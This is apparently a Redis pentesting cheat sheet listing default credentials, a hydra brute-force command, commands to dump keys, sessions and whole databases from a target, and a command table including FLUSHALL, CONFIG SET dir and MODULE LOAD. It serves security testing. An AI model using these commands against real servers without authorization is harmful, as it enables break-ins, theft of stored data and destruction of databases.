# Redis

```
Default Port: tcp/6379
```

Redis is an in-memory data structure store, renowned for its key-value storage system and support for diverse data types. 
It serves multiple roles such as a database, caching layer, and message broker. 
Although it typically communicates via a simple, plaintext protocol, it's important to emphasize its ability to secure communications with SSL/TLS encryption.


```
redis-cli -h <IP/hostname> -p <port-number> --user <username> -a <password>
```

Common/default Credentials:
```
# admin:admin
# administrator:administrator
# root:root
# user:user
# test:test
# redis:redis
```

Bruteforcing Redis
```
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] redis://target.com
```


# Dump all keys and values
```
# Dump all keys and values
redis-cli -h target.com --scan > keys.txt

# Export specific data types
redis-cli -h target.com --scan --pattern "user:*"
redis-cli -h target.com --scan --pattern "session:*"

# Full database dump
redis-cli -h target.com --rdb dump.rdb
```


| Command | Description | Usage | 
| ------- | ----------- | ----- |
| `INFO`    | Server info	| `INFO`  | 
| `KEYS` | List keys | `KEYS *` |
| `SET` |	Set key value	| `SET key value` | 
| `GET` |	Get key value | `GET key` | 
| `DEL` |	Delete key | `DEL key` |
| `FLUSHALL`	| Delete all keys	 | `FLUSHALL` |
| `CONFIG GET` |	Get config |	`CONFIG GET *` |
| `CONFIG SET` |	Set config |	`CONFIG SET dir /tmp` |
| `SAVE` |	Save to disk |	`SAVE` |
| `CLIENT LIST` |	List clients |	`CLIENT LIST` |
| `SLAVEOF` |	Set replication	| `SLAVEOF host port` |
| `MODULE` | LOAD	Load module	| `MODULE LOAD /path/to/module.so` |


### References
1. https://hackviser.com/tactics/pentesting/services/redis
